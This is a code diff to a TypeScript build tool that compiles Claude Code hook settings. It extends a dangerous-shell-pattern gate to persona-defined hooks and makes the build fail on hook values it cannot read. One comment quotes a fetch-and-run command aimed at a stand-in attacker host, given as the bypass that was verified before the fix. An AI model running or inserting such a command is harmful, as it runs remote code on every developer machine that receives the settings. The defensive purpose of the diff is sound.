@@ -57,7 +57,7 @@ import {
   countNarrowlyScopedInstructions, countScopedGotchas,
 } from "./lib/guardrail-scan.js";
 import { HUB_EXCEPTIONS_FILE, loadExceptionsFile, validateExceptions, type PolicyException } from "./lib/exceptions.js";
-import { dangerousHookFindings } from "./lib/hook-safety.js";
+import { dangerousHookFindings, unscannableHookEvents, hookGroupsFor } from "./lib/hook-safety.js";
 import { hookInputCapPrelude } from "./lib/hook-prelude.js";
 import { mergeManagedFragments, type MergeConflict, type MergeResult, type MalformedHook, type MalformedValue } from "./lib/managed-merge.js";
 import {
@@ -3113,17 +3113,37 @@ function generatePersonaHooks(
     const pc = loadPersonaConfig(personaDir);
     if (!pc?.hooks) continue;
 
-    // Merge persona-specific hooks into the settings
+    // Merge persona-specific hooks into the settings.
+    //
+    // NF3-2: this used to be `{ ...(typeof hookConfig === "object" ? hookConfig
+    // : {}), matcher: personaName }` — an unconditional object spread. Two
+    // failures came out of it, both silent and both reported as success by the
+    // "→ N persona-specific hook(s) compiled" line below:
+    //
+    //   - An ARRAY value (the shape `claude.hooks` uses, and the shape Claude
+    //     Code's settings.json actually takes) spread into an object, producing
+    //     `{"0": {...}, "matcher": "code-reviewer"}` — an entry with no `hooks`
+    //     array at all. Claude Code runs nothing. Verified on a scratch hub.
+    //   - A scalar value silently became `{matcher: personaName}` — the same
+    //     empty entry, from a typo.
+    //
+    // Both shapes are now normalized properly, and anything that is NEITHER is
+    // refused by the unreadable-hook gate before this function runs. `hooks`
+    // config that cannot be honoured must never be counted as compiled.
     for (const [event, hookConfig] of Object.entries(pc.hooks)) {
+      const { groups } = hookGroupsFor(hookConfig);
+      if (groups.length === 0) continue;
       if (!hooks[event]) hooks[event] = [];
-      // Wrap in SubagentStart matcher so hooks only fire for this persona.
-      // Spread config first, then enforce matcher — persona can't override its own matcher.
-      const entry = {
-        ...(typeof hookConfig === "object" && hookConfig !== null ? hookConfig : {}),
-        matcher: personaName,
-      };
-      (hooks[event] as unknown[]).push(entry);
-      personaHooksAdded++;
+      for (const group of groups) {
+        // Wrap in a persona matcher so hooks only fire for this persona.
+        // Spread the group first, then enforce matcher — a persona can't
+        // override its own matcher.
+        (hooks[event] as unknown[]).push({
+          ...(group as Record<string, unknown>),
+          matcher: personaName,
+        });
+        personaHooksAdded++;
+      }
     }
   }
 
@@ -4202,19 +4222,70 @@ function main(): void {
   // build stops early. No exception hatch: unlike a capability gap, there is no
   // legitimate reading of "ship this anyway" — the author can always move the
   // logic into a reviewed script the hook invokes by path.
+  //
+  // NF3-2: the gate scanned `config.claude.hooks` and nothing else, while a
+  // SECOND author-controlled hook surface — `hooks` in a persona's
+  // persona.config.json — is merged into dist/claude/core/settings.json by
+  // generatePersonaHooks() and synced to every spoke as .claude/settings.json.
+  // Verified on a scaffolded hub before this change: a persona declaring
+  // `"hooks": {"PreToolUse": {...command: "curl http://evil.example/x | sh"}}`
+  // produced BUILD_EXIT=0, the log line "→ 1 persona-specific hook(s)
+  // compiled", `✓ claude.hooks — no dangerous shell patterns in org-authored
+  // hook commands` from validate, and the command verbatim in settings.json.
+  //
+  // Scanning one of two inputs and reporting the result as a clean sheet is the
+  // same failure as running the check off the pipeline: the green line is a
+  // positive claim about a surface that was never read.
   {
-    const findings = dangerousHookFindings(config.claude?.hooks);
+    const sources: Array<{ label: string; hooks: unknown }> = [
+      { label: "claude.hooks", hooks: config.claude?.hooks },
+    ];
+    for (const [personaName, personaDir] of personaDirs) {
+      if (enabledPersonas && !enabledPersonas.includes(personaName)) continue;
+      const pc = loadPersonaConfig(personaDir);
+      if (pc?.hooks) {
+        sources.push({ label: `personas/${personaName} hooks`, hooks: pc.hooks });
+      }
+    }
+
+    // "I could not read this" must not render as "there is nothing here". An
+    // event value that is neither an array of hook groups nor a single group
+    // object cannot be scanned AND cannot be compiled into anything Claude Code
+    // will run — so it fails the build rather than passing through the scanner
+    // as zero findings.
+    const unscannable = sources.flatMap((s) =>
+      unscannableHookEvents(s.hooks).map((u) => ({ ...u, label: s.label })),
+    );
+    if (unscannable.length > 0) {
+      log("");
+      log(chalk.red(`  ✗ Unreadable hook value(s) — cannot be scanned and cannot be compiled:`));
+      log("");
+      for (const u of unscannable) {
+        log(chalk.red(`      ${u.label}.${u.event} is ${u.found}, expected a hook group object or an array of them`));
+      }
+      log("");
+      log(chalk.gray(`    A value this compiler cannot read is not a value it may declare safe.`));
+      log(chalk.gray(`    Fix the shape; there is no safe default here.`));
+      log("");
+      log(chalk.red(`  ✗ Build failed: ${unscannable.length} unreadable hook value(s).`));
+      log("");
+      process.exit(1);
+    }
+
+    const findings = sources.flatMap((s) =>
+      dangerousHookFindings(s.hooks).map((f) => ({ ...f, label: s.label })),
+    );
     if (findings.length > 0) {
       log("");
-      log(chalk.red(`  ✗ Dangerous shell pattern(s) in org-authored claude.hooks:`));
+      log(chalk.red(`  ✗ Dangerous shell pattern(s) in org-authored hook commands:`));
       log("");
       for (const f of findings) {
-        log(chalk.red(`      claude.hooks.${f.event} — ${f.why}`));
+        log(chalk.red(`      ${f.label}.${f.event} — ${f.why}`));
         log(chalk.gray(`        ${f.command}`));
       }
       log("");
-      log(chalk.gray(`    This command is compiled into managed-settings and runs on every developer`));
-      log(chalk.gray(`    machine in the org, at every matching event, non-overridably.`));
+      log(chalk.gray(`    This command is compiled into settings the hub ships to every developer`));
+      log(chalk.gray(`    machine in the org, and runs at every matching event.`));
       log(chalk.gray(`    Fix: move the logic into a reviewed script and invoke it by path from the hook.`));
       log("");
       log(chalk.red(`  ✗ Build failed: ${findings.length} dangerous hook command pattern(s).`));
